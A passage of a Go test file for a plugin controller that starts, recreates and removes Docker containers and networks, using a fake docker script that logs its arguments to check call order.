	if code, _ := call(t, srv, tok, "POST", "/v1/instances", ctlapi.StartRequest{InstanceID: "p1", Type: plugins.TypeLLM, Digest: "sha256:" + strings.Repeat("b", 64), Manifest: llmManifest, Env: map[string]string{"X": "1"}}); code != 200 {
		t.Fatal("idempotent start failed")
	}
	if len(fr.runs) != 1 {
		t.Fatalf("an identical start created %d containers", len(fr.runs))
	}
	// Changed secrets/config recreate it.
	if code, _ := call(t, srv, tok, "POST", "/v1/instances", ctlapi.StartRequest{InstanceID: "p1", Type: plugins.TypeLLM, Digest: "sha256:" + strings.Repeat("b", 64), Manifest: llmManifest, Env: map[string]string{"X": "2"}}); code != 200 {
		t.Fatal("restart with new env failed")
	}
	if len(fr.runs) != 2 || len(fr.removed) == 0 {
		t.Fatalf("changed env must recreate the container: runs=%d removed=%v", len(fr.runs), fr.removed)
	}
	// Stop removes it.
	if code, _ := call(t, srv, tok, "DELETE", "/v1/instances/p1", nil); code != 200 {
		t.Fatal("stop failed")
	}
	if _, err := fr.Inspect(context.Background(), "llmcache-plugin-p1"); err != nil || fr.running["llmcache-plugin-p1"] != nil {
		t.Fatal("container still running after stop")
	}
}

func TestNetworkModeRequiresTheControllerToBeInAContainer(t *testing.T) {
	_, srv := newServer(t, func(c *Config) { c.Publish = false; c.SelfContainer = "" }, newFake(), nil)
	code, body := call(t, srv, "controller-token-1234567890", "POST", "/v1/instances",
		ctlapi.StartRequest{InstanceID: "p1", Type: plugins.TypeLLM, Digest: "sha256:" + strings.Repeat("b", 64), Manifest: llmManifest})
	if code/100 != 4 || !strings.Contains(string(body), "PLUGIN_CONTROLLER") {
		t.Fatalf("%d %s", code, body)
	}
}

// A plugin's network can only be removed after the controller has left it. If it
// does not leave, every removed plugin leaks a network and Docker's small default
// address pool is eventually exhausted ("all predefined address pools have been
// fully subnetted"). This was found by the end-to-end run against a real stack.
func TestRemoveDisconnectsTheControllerBeforeRemovingTheNetwork(t *testing.T) {
	dir := t.TempDir()
	logFile := filepath.Join(dir, "calls.log")
	script := filepath.Join(dir, "docker")
	if err := os.WriteFile(script, []byte("#!/bin/sh\necho \"$@\" >> "+logFile+"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	d := &DockerCLI{Bin: script, Env: os.Environ(), Self: "controller-abc123"}
	d.Remove(context.Background(), "llmcache-plugin-plg_1")
	b, _ := os.ReadFile(logFile)
	calls := strings.Split(strings.TrimSpace(string(b)), "\n")
	want := []string{
		"rm --force --volumes llmcache-plugin-plg_1",
		"network disconnect --force llmcache-plugin-plg_1 controller-abc123",
		"network rm llmcache-plugin-plg_1",
	}
	if len(calls) != 3 {
		t.Fatalf("docker calls = %q, want %q", calls, want)
	}
	for i := range want {
		if calls[i] != want[i] {
			t.Errorf("call %d = %q, want %q", i, calls[i], want[i])
		}
	}
	// Publish mode (no controller container) has nothing to disconnect.
	_ = os.Remove(logFile)
	(&DockerCLI{Bin: script, Env: os.Environ()}).Remove(context.Background(), "llmcache-plugin-plg_2")
	b, _ = os.ReadFile(logFile)
	if strings.Contains(string(b), "disconnect") {
		t.Errorf("unexpected disconnect: %s", b)
	}
	// Names that are not ours are never passed to docker.
	_ = os.Remove(logFile)
	d.Remove(context.Background(), "some-other-container")
	if _, err := os.Stat(logFile); err == nil {
		t.Error("docker was invoked for a container the controller does not own")
	}
}
